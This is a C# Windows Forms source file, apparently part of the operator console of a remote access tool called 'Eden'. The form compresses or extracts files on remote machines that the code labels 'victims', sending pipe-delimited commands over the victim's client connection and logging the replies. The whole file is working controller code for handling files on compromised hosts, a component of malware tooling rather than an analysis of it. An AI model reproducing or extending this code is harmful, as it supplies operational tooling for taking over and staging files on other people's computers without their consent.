using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileArchive : Form
    {
        private frmFileMgr m_frmMgr { get; init; }
        private clsVictim m_victim { get; init; }
        private List<frmFileMgr.stEntryTag> m_lstEntry { get; init; }
        private bool m_bCompress { get; init; }

        public frmFileArchive(frmFileMgr frmMgr, clsVictim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
        {
            InitializeComponent();

            m_frmMgr = frmMgr;
            m_victim = victim;
            m_lstEntry = lstEntry;
            m_bCompress = bCompress;

            Text = $@"Archive\\{victim.m_szID}";
        }

        private enum enUnzipMethod
        {
            Separate, //Extract all file into
            Current, //Extract all entries into current folder.
        }

        private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;

        private void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_victim.m_szID))
                return;

            if (lsMsg[0] == "file" && lsMsg[1] == "archive")
            {
                if (lsMsg[2] == "zip")
                {
                    int nCode = int.Parse(lsMsg[3]);
                    string szFilePath = lsMsg[4];

                    fnLogs(nCode == 0 ? $"Failed[{szFilePath}] => " + lsMsg[5] : $"Successed[{szFilePath}]");
                    Invoke(() => m_frmMgr.LvRefresh());
                }
                else if (lsMsg[2] == "unzip")
                {
                    var ls2d = clsTools.EZData.String2TwoDList(lsMsg[3]);
                    foreach (var ls in ls2d)
                    {
                        int nCode = int.Parse(ls[0]);
                        string szFilePath = ls[1];

                        Invoke(() =>
                        {
                            List<ListViewItem> items = listView2.Items.Cast<ListViewItem>().ToList().Where(x => string.Equals(fnGetItemTag(x).szFullName, szFilePath)).ToList();
                            if (items.Count == 0)
                            {
                                fnLogs("Unknown archive file: " + szFilePath);
                                return;
                            }

                            ListViewItem item = items.First();
                            item.SubItems[1].Text = nCode == 0 ? "Failed" : "OK";
                            fnLogs(nCode == 0 ? "Failed => " + szFilePath : "Successed => " + szFilePath);
                        });
                    }

                    Invoke(() => m_frmMgr.LvRefresh());
                }
            }
        }

        private void fnLogs(string szMsg)
        {
            Invoke(() =>
            {
                richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}]: {szMsg}");
                richTextBox1.AppendText(Environment.NewLine);
            });
        }

        private void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            tabControl1.SelectedIndex = m_bCompress ? 0 : 1;

            foreach (var entry in m_lstEntry)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(entry.szFullName));
                item.Tag = entry;

                if (m_bCompress)
                {
                    listView1.Items.Add(item);
                }
                else
                {
                    item.SubItems.Add("?");
                    listView2.Items.Add(item);
                }
            }

            textBox1.Text = clsTools.GetFileNameFromDatetime("zip");

            foreach (string szMethod in Enum.GetNames(typeof(enUnzipMethod)))
                comboBox1.Items.Add(szMethod);

            comboBox1.SelectedIndex = 0;
            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;

            toolStripStatusLabel1.Text = $"Entry[{listView1.Items.Count}]";
            toolStripStatusLabel2.Text = $"File[{listView2.Items.Count}]";
        }

        private void frmFileArchive_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var lEntry = listView1.Items.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lEntry.Count == 0)
                return;

            string szArchiveName = textBox1.Text;

            Task.Run(() =>
            {
                List<string> lsFolder = lEntry.Where(x => x.bDirectory).Select(x => x.szFullName).ToList();
                List<string> lsFile = lEntry.Where(x => !x.bDirectory).Select(x => x.szFullName).ToList();

                szArchiveName = Path.Combine(m_frmMgr.fnGetCurrentDir(), szArchiveName).Replace("\\", "/");

                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "archive",
                    "zip",
                    szArchiveName,
                    clsTools.EZData.OneDList2String(lsFolder),
                    clsTools.EZData.OneDList2String(lsFile),
                }));
            });
        }

        private void frmFileArchive_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var lEntry = listView2.Items.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lEntry.Count == 0)
                return;

            string szMethod = comboBox1.Text;

            _ = Task.Run(() =>
            {
                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "archive",
                    "unzip",
                    szMethod,
                    string.Join(",", lEntry.Select(x => EZCrypto.Encoder.stre2b64(x.szFullName))),
                }));
            });
        }
    }
}
